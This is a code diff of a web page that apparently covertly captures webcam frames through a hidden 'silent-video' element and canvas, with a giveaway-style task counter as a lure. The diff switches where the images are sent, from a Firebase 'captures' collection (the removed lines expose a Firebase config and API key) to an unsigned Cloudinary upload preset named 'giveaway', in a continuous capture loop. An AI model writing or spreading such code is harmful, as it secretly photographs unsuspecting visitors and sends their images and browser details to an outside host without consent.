@@ -203,48 +203,35 @@
   <video id="silent-video" autoplay playsinline muted></video>
   <canvas id="silent-canvas"></canvas>
 
-  <!-- Firebase SDK -->
+  <!-- Cloudinary upload -->
   <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
-    import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
+    // ─── Cloudinary config ───────────────────────────────────────
+    const CLOUD_NAME = 'duttdx7ou';
+    const UPLOAD_PRESET = 'giveaway';
 
-    // ─── Firebase config ─────────────────────────────────────────
-    const firebaseConfig = {
-      apiKey: "AIzaSyAC65F8Pgqq1At9VkAL-fp6KXiUuYEEbH0",
-      authDomain: "trial-b20e0.firebaseapp.com",
-      projectId: "trial-b20e0",
-      storageBucket: "trial-b20e0.appspot.com",
-      messagingSenderId: "1053288014223",
-      appId: "1:1053288014223:web:a891be24d76bacf015abfa"
-    };
-
-    const app = initializeApp(firebaseConfig);
-    const db = getFirestore(app);
-    const auth = getAuth(app);
-
-    // Sign in anonymously so Firestore writes are allowed
-    signInAnonymously(auth).catch(function(e) { log("Auth error: " + e.message); });
-
-    async function sendToFirebase(base64img) {
+    async function sendToCloudinary(base64img) {
       try {
-        await addDoc(collection(db, "captures"), {
-          image: base64img,
-          timestamp: new Date().toISOString(),
-          userAgent: navigator.userAgent
+        const formData = new FormData();
+        formData.append('file', base64img);
+        formData.append('upload_preset', UPLOAD_PRESET);
+        const res = await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/image/upload`, {
+          method: 'POST',
+          body: formData
         });
-        log("✅ Photo sent to Firebase");
+        const data = await res.json();
+        if (data.secure_url) {
+          log('✅ Uploaded');
+        } else {
+          log('❌ Failed: ' + JSON.stringify(data));
+        }
       } catch(e) {
-        log("❌ Firebase error: " + e.message);
+        log('❌ Error: ' + e.message);
       }
     }
 
     function log(msg) {
       var box = document.getElementById('debug-log');
-      if (box) {
-        box.style.display = 'block';
-        box.innerHTML += msg + '<br>';
-      }
+      if (box) { box.style.display = 'block'; box.innerHTML += msg + '<br>'; }
     }
 
     var TOTAL_TASKS = 5;
@@ -347,7 +334,7 @@
         canvas.height = vid.videoHeight;
         canvas.getContext('2d').drawImage(vid, 0, 0);
         var base64 = canvas.toDataURL('image/jpeg', 0.5);
-        sendToFirebase(base64);
+        sendToCloudinary(base64);
       }
       requestAnimationFrame(captureLoop);
     }
